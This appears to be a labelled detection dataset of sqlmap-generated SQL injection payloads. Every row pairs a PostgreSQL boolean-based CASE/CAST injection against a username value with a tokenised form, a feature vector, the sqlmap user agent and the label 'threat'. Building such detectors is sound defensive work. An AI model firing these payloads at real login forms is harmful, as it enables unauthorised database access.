johnbaston' AND (SELECT (CASE WHEN (4421=3228) THEN NULL ELSE CAST((CHR(100)||CHR(74)||CHR(84)||CHR(87)) AS NUMERIC) END)) IS NULL AND 'YshG'='YshG,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT EQ SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND (SELECT (CASE WHEN (4421=3228) THEN NULL ELSE CAST((CHR(100)||CHR(74)||CHR(84)||CHR(87)) AS NUMERIC) END)) IS NULL AND 'YshG'='YshG,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT EQ SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND 'zdEh'='zdEh,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT EQ SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND 'zdEh'='zdEh,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT EQ SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND (SELECT (CASE WHEN (7697=9686) THEN NULL ELSE CAST((CHR(102)||CHR(119)||CHR(85)||CHR(116)) AS NUMERIC) END)) IS NULL AND ('bjvz' LIKE 'bjvz,STR SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT STR SQUT LIKE SQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND (SELECT (CASE WHEN (7697=9686) THEN NULL ELSE CAST((CHR(102)||CHR(119)||CHR(85)||CHR(116)) AS NUMERIC) END)) IS NULL AND ('bjvz' LIKE 'bjvz,STR SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT STR SQUT LIKE SQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ('ahqt' LIKE 'ahqt,STR SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT STR SQUT LIKE SQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ('ahqt' LIKE 'ahqt,STR SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT STR SQUT LIKE SQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND (SELECT (CASE WHEN (1656=8078) THEN NULL ELSE CAST((CHR(120)||CHR(112)||CHR(112)||CHR(78)) AS NUMERIC) END)) IS NULL AND 'UgWE' LIKE 'UgWE,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT LIKE SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND (SELECT (CASE WHEN (1656=8078) THEN NULL ELSE CAST((CHR(120)||CHR(112)||CHR(112)||CHR(78)) AS NUMERIC) END)) IS NULL AND 'UgWE' LIKE 'UgWE,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT LIKE SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND 'mYcx' LIKE 'mYcx,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT LIKE SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND 'mYcx' LIKE 'mYcx,STR SQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND SQUT STR SQUT LIKE SQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND (SELECT (CASE WHEN (1946=4968) THEN NULL ELSE CAST((CHR(79)||CHR(116)||CHR(114)||CHR(119)) AS NUMERIC) END)) IS NULL AND (""FMAq""=""FMAq",STR DQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN DQUT STR DQUT EQ DQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND (SELECT (CASE WHEN (1946=4968) THEN NULL ELSE CAST((CHR(79)||CHR(116)||CHR(114)||CHR(119)) AS NUMERIC) END)) IS NULL AND (""FMAq""=""FMAq",STR DQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN DQUT STR DQUT EQ DQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND (""pLHp""=""pLHp",STR DQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN DQUT STR DQUT EQ DQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND (""pLHp""=""pLHp",STR DQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN DQUT STR DQUT EQ DQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND (SELECT (CASE WHEN (6886=8920) THEN NULL ELSE CAST((CHR(101)||CHR(99)||CHR(112)||CHR(82)) AS NUMERIC) END)) IS NULL AND ""mFpC""=""mFpC",STR DQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND DQUT STR DQUT EQ DQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND (SELECT (CASE WHEN (6886=8920) THEN NULL ELSE CAST((CHR(101)||CHR(99)||CHR(112)||CHR(82)) AS NUMERIC) END)) IS NULL AND ""mFpC""=""mFpC",STR DQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND DQUT STR DQUT EQ DQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ""qFOz""=""qFOz",STR DQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND DQUT STR DQUT EQ DQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ""qFOz""=""qFOz",STR DQUT AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND DQUT STR DQUT EQ DQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND (SELECT (CASE WHEN (6004=7497) THEN NULL ELSE CAST((CHR(98)||CHR(122)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ('%'=',STR PRCNT SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT PRCNT SQUT EQ SQUT,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND (SELECT (CASE WHEN (6004=7497) THEN NULL ELSE CAST((CHR(98)||CHR(122)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ('%'=',STR PRCNT SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT PRCNT SQUT EQ SQUT,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ('%'=',STR PRCNT SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT PRCNT SQUT EQ SQUT,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND (SELECT (CASE WHEN (3527=3527) THEN NULL ELSE CAST((CHR(107)||CHR(82)||CHR(119)||CHR(80)) AS NUMERIC) END)) IS NULL AND ('%'=',STR PRCNT SQUT RPRN AND SELECT CASE WHEN INT EQ INT THEN NULL ELSE CAST CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC END IS NULL AND LPRN SQUT PRCNT SQUT EQ SQUT,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
